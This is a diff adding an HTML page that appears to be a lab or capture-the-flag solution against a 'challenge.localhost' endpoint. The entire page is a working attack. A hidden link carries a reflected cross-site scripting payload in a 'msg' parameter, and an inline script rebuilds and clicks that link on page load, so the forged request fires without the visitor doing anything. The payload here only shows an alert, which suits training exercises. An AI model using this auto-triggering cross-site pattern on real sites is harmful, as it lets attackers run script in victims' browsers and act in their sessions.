@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <a href="http://challenge.localhost/ephemeral?msg=<script>alert('PWNED')</script>" id="csrf-link" style="display:none">CSRF</a>
+    <script>
+      // Dynamically construct the script tag to avoid breaking the HTML
+      var csrfUrl = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent("<script>alert('PWNED')</" + "script>");
+      document.getElementById("csrf-link").href = csrfUrl;
+      // Trigger the link click automatically
+      document.getElementById("csrf-link").click();
+    </script>
+  </body>
+</html>
+
